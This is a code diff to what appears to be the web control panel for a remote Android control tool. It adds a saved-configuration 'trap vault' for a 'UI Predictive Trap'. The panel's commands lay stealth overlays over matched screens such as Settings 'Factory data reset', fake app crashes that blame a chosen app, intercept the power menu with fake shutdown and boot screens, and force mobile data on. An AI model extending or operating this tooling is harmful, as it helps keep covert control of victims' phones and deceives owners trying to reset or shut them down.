@@ -330,6 +330,7 @@
         let activeFileName = "";
         let activeTab = 'dash';
         let touchChain = [];
+        let selectedTrapId = null;
         let logoClicks = 0;
         let logoTimer = null;
 
@@ -421,7 +422,64 @@
                                         { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs:[] },
                     { id: 'STATUS_BAR_UI', name: 'Status Bar Injection', icon: '🚥', keywords: 'status, top, bar, overlay', inputs: [{id: 'sb-state', label: 'State', type: 'select', options:[{v: 'ON', l: 'Activate'}, {v: 'OFF', l: 'Deactivate'}]}, {id: 'sb-touchable', label: 'Input Mode', type: 'select', options:[{v: 'FALSE', l: 'Ghost (Pass-through)'}, {v: 'TRUE', l: 'Touchable'}]}, {id: 'sb-html', label: 'HTML Content', type: 'textarea', placeholder: '<html>...'}] },
                     { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html-shutdown', label: 'Shutdown HTML Payload', type: 'textarea', placeholder: '<html>Shutdown Content</html>'}, {id: 'ps-html-boot', label: 'Boot/Logo HTML Payload', type: 'textarea', placeholder: '<html>Boot/Logo Content</html>'}] },
-                    { id: 'UI_TRAP', name: 'UI Predictive Trap', icon: '🪤', inputs: [{id: 'ui-trap-target', label: 'Fingerprint (Title@@Summary@@Pkg@@Anchor)', type: 'text', placeholder: 'Reset@@Factory data reset@@settings@@Reset'}, {id: 'ui-trap-method', label: 'Logic Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth Overlay)'}, {v: 'OVERLAY', l: 'Standard Overlay'}, {v: 'ANR', l: 'ANR (Mock Crash)'}]}, {id: 'ui-trap-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ui-trap-dim', label: 'Dim Level % (0=Black, 100=Normal)', type: 'number', val: 20}, {id: 'ui-trap-html', label: 'Payload (HTML or Blamed App Name)', type: 'textarea', placeholder: '<html>... or App Name'}] },
+                    { 
+                        id: 'UI_TRAP', 
+                        name: 'UI Predictive Trap', 
+                        icon: '🪤', 
+                        inputs: [],
+                        customUI: `
+                            <div id="trap-manager-container" style="background:rgba(0,243,255,0.02); border:1px dashed #333; padding:10px; margin-bottom:10px;">
+                                <!-- List View -->
+                                <div id="trap-list-view">
+                                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                                        <div class="cmd-label">SAVED_CONFIGS</div>
+                                        <button class="btn" onclick="openTrapEditor()" style="padding:2px 8px; font-size:0.8rem;">+ NEW</button>
+                                    </div>
+                                    <div id="trap-registry-list" style="display:flex; flex-direction:column; gap:5px; max-height:200px; overflow-y:auto;"></div>
+                                </div>
+
+                                <!-- Editor View (Hidden by default) -->
+                                <div id="trap-editor-view" style="display:none;">
+                                    <div class="cmd-label" id="trap-editor-title" style="margin-bottom:10px; color:var(--success);">CREATE_NEW_TRAP</div>
+                                    <input type="hidden" id="edit-trap-id">
+                                    <div class="cmd-row">
+                                        <label style="font-size:0.6rem; color:#666;">CONFIG_LABEL</label>
+                                        <input type="text" id="trap-reg-label" placeholder="e.g. Settings Reset Protection">
+                                    </div>
+                                    <div class="cmd-row">
+                                        <label style="font-size:0.6rem; color:#666;">FINGERPRINT (Title@@Summary@@Pkg@@Anchor)</label>
+                                        <input type="text" id="trap-reg-target" placeholder="Reset@@Factory data reset@@settings">
+                                    </div>
+                                    <div style="display:flex; gap:5px; margin-bottom:10px;">
+                                        <div style="flex:1">
+                                            <label style="font-size:0.6rem; color:#666;">LAYER</label>
+                                            <select id="trap-reg-method" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
+                                                <option value="ACC">ACC (Stealth)</option>
+                                                <option value="OVERLAY">OVERLAY</option>
+                                                <option value="ANR">ANR (Crash)</option>
+                                            </select>
+                                        </div>
+                                        <div style="width:60px">
+                                            <label style="font-size:0.6rem; color:#666;">TTL(s)</label>
+                                            <input type="number" id="trap-reg-timeout" value="15">
+                                        </div>
+                                        <div style="width:60px">
+                                            <label style="font-size:0.6rem; color:#666;">DIM%</label>
+                                            <input type="number" id="trap-reg-dim" value="20">
+                                        </div>
+                                    </div>
+                                    <div class="cmd-row">
+                                        <label style="font-size:0.6rem; color:#666;">PAYLOAD (HTML/APP_NAME)</label>
+                                        <textarea id="trap-reg-html" style="height:60px;"></textarea>
+                                    </div>
+                                    <div style="display:flex; gap:5px;">
+                                        <button class="btn" style="flex:1; border-color:var(--success); color:var(--success);" onclick="saveTrapToRegistry()">SAVE_TO_VAULT</button>
+                                        <button class="btn" style="border-color:#444;" onclick="closeTrapEditor()">CANCEL</button>
+                                    </div>
+                                </div>
+                            </div>
+                        ` 
+                    },
                     { id: 'FORCE_DATA', name: 'Ghost Hand Data Toggle', icon: '📡', keywords: 'mobile, data, cellular, internet', inputs: [] },
                     { id: 'CLEAR_UI_TRAP', name: 'Disarm UI Trap', icon: '🔓', inputs: [] }
                 ]
@@ -646,6 +704,105 @@
             touchChain = [];
             renderTouchChain();
         }
+
+        // --- UI TRAP REGISTRY ENGINE ---
+        function renderTrapList() {
+            const listContainer = document.getElementById('trap-registry-list');
+            if (!listContainer) return;
+            const registry = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
+            
+            if (registry.length === 0) {
+                listContainer.innerHTML = '<div style="text-align:center; color:#444; font-size:0.7rem; padding:10px;">NO_SAVED_CONFIGS</div>';
+                return;
+            }
+
+            listContainer.innerHTML = registry.map(trap => `
+                <div style="display:flex; align-items:center; background:${selectedTrapId === trap.id ? 'rgba(0,243,255,0.1)' : '#0a0b0d'}; border:1px solid ${selectedTrapId === trap.id ? 'var(--primary)' : '#222'}; padding:8px; gap:8px;">
+                    <div style="flex:1; cursor:pointer;" onclick="selectTrap('${trap.id}')">
+                        <div style="font-size:0.75rem; color:${selectedTrapId === trap.id ? 'var(--primary)' : '#fff'};">${trap.label || 'Unnamed Trap'}</div>
+                        <div style="font-size:0.55rem; color:#555; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${trap.target}</div>
+                    </div>
+                    <button class="btn-tag" onclick="editTrap('${trap.id}')">✏️</button>
+                    <button class="btn-tag" style="color:var(--danger)" onclick="deleteTrap('${trap.id}')">×</button>
+                </div>
+            `).join('');
+        }
+
+        function openTrapEditor() {
+            document.getElementById('trap-list-view').style.display = 'none';
+            document.getElementById('trap-editor-view').style.display = 'block';
+            document.getElementById('edit-trap-id').value = '';
+            document.getElementById('trap-editor-title').innerText = 'CREATE_NEW_TRAP';
+            // Clear inputs
+            ['label', 'target', 'method', 'timeout', 'dim', 'html'].forEach(k => {
+                const el = document.getElementById('trap-reg-' + k);
+                if (el) el.value = k === 'timeout' ? '15' : (k === 'dim' ? '20' : '');
+            });
+        }
+
+        function closeTrapEditor() {
+            document.getElementById('trap-list-view').style.display = 'block';
+            document.getElementById('trap-editor-view').style.display = 'none';
+        }
+
+        function saveTrapToRegistry() {
+            const id = document.getElementById('edit-trap-id').value || 'trap_' + Date.now();
+            const newTrap = {
+                id: id,
+                label: document.getElementById('trap-reg-label').value.trim() || 'Unnamed Trap',
+                target: document.getElementById('trap-reg-target').value.trim(),
+                method: document.getElementById('trap-reg-method').value,
+                timeout: document.getElementById('trap-reg-timeout').value,
+                dim: document.getElementById('trap-reg-dim').value,
+                html: document.getElementById('trap-reg-html').value.trim()
+            };
+
+            if (!newTrap.target) return toast("FINGERPRINT REQUIRED", "danger");
+
+            const registry = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
+            const existingIdx = registry.findIndex(t => t.id === id);
+            
+            if (existingIdx > -1) registry[existingIdx] = newTrap;
+            else registry.push(newTrap);
+
+            localStorage.setItem('cortex_trap_registry', JSON.stringify(registry));
+            selectedTrapId = id;
+            closeTrapEditor();
+            renderTrapList();
+            toast("TRAP_VAULT_UPDATED", "success");
+        }
+
+        function editTrap(id) {
+            const registry = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
+            const trap = registry.find(t => t.id === id);
+            if (!trap) return;
+
+            openTrapEditor();
+            document.getElementById('trap-editor-title').innerText = 'REVISE_TRAP_CONFIG';
+            document.getElementById('edit-trap-id').value = trap.id;
+            document.getElementById('trap-reg-label').value = trap.label;
+            document.getElementById('trap-reg-target').value = trap.target;
+            document.getElementById('trap-reg-method').value = trap.method;
+            document.getElementById('trap-reg-timeout').value = trap.timeout;
+            document.getElementById('trap-reg-dim').value = trap.dim;
+            document.getElementById('trap-reg-html').value = trap.html;
+        }
+
+        function deleteTrap(id) {
+            if (!confirm("PURGE THIS CONFIGURATION?")) return;
+            let registry = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
+            registry = registry.filter(t => t.id !== id);
+            localStorage.setItem('cortex_trap_registry', JSON.stringify(registry));
+            if (selectedTrapId === id) selectedTrapId = null;
+            renderTrapList();
+            toast("CONFIG_PURGED", "success");
+        }
+
+        function selectTrap(id) {
+            selectedTrapId = id;
+            renderTrapList();
+            toast("TRAP_ARMED", "success");
+        }
         const tabScrollPositions = { 'dash': 0, 'cmd': 0, 'files': 0 };
 
         window.onload = async () => {
@@ -660,6 +817,7 @@
             fetchFiles(); 
             initSearchSuggestions();
             refreshTagStates();
+            renderTrapList();
         };
 
         function saveConfig() {
@@ -1024,12 +1182,11 @@
                         const explanation = document.getElementById('install-html').value;
                         content = explanation ? `${path} | ${explanation}` : path; break;
                     case 'UI_TRAP':
-                        const uit = document.getElementById('ui-trap-target').value;
-                        const uim = document.getElementById('ui-trap-method').value;
-                        const uio = document.getElementById('ui-trap-timeout').value;
-                        const uid = document.getElementById('ui-trap-dim').value;
-                        const uih = document.getElementById('ui-trap-html').value;
-                        content = `${uit}|${uim}|${uio}|${uid}|${uih}`; break;
+                        const registry = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
+                        const activeTrap = registry.find(t => t.id === selectedTrapId);
+                        if (!activeTrap) return toast("SELECT OR CREATE A TRAP FIRST", "danger");
+                        content = `${activeTrap.target}|${activeTrap.method}|${activeTrap.timeout}|${activeTrap.dim}|${activeTrap.html}`; 
+                        break;
                     case 'POWER_SHIELD':
                         const pst = document.getElementById('ps-toggle').value;
                         const pso = document.getElementById('ps-timeout').value;
